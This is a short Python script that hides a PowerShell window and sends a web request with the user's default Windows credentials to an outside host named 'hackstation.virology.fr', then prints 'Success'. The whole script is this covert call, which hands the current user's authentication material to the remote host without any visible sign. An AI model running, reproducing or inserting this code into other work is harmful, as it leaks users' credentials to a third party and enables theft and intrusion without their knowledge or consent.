def main():
    import subprocess

    ps_command = "Invoke-WebRequest -uri http://hackstation.virology.fr -UseDefaultCredentials"

    subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

    print("Success")

main()